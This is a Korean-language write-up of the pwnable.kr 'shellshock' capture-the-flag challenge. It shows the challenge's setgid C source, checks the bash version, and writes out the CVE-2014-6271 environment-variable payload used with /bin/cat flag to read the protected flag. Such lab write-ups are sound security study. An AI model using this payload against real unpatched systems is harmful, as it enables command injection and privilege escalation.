# shellshock

# 문제

> Mommy, there was a shocking news about bash.
>
> I bet you already know, but lets just make it sure :\)
>
> ssh shellshock@pwnable.kr -p2222 \(pw:guest\)

# 소스

```
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

# 취약점

[Shellshock](https://goyunho.gitbooks.io/solutions/content/system/shellshock.html)\(bash shell\) 취약점

# 공략

#### 1. bash의 Shellshock 취약점 유무 확인

```
shellshock@ubuntu:~$ ls -l
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
```

파일 목록을 보면 bash 파일이 있는데 이 bash shell로 이동해서 버전을 확인해보았다

```
shellshock@ubuntu:~$ ./bash
shellshock@ubuntu:~$ echo $BASH_VERSION
4.2.25(1)-release
```

Shellshock 취약점은 bash 버전 4.3에서 패치되었으므로 현재 폴더에 있는 bash는 Shellshock 취약점이 있음을 알 수 있다.

#### 2. 풀이

소스를 보면 uid와 gid를 유효 그룹 ID값으로 다시 설정하고 system 함수 안에 있는 명령어를 실행하고 종료하는 프로그램이다.

이를 이용하려면 Shellshock의 취약점 중 하나인 CVE-2014-6271을 사용하여 환경변수 설정과 원하는 명령을 입력해야 한다.

export x="\(\) { :; }; \[임의의 명령\];"

이 문제에서는 flag의 내용을 봐야 하므로 임의의 명령에 /bin/cat flag를 넣어서 쉘에 입력한다.

그 다음 ./shellshock로 컴파일된 프로그램을 실행하면 flag가 나오게 된다.

flag를 pwnable.kr에 입력하면 풀이 성공

![](/assets/shellshock.PNG)

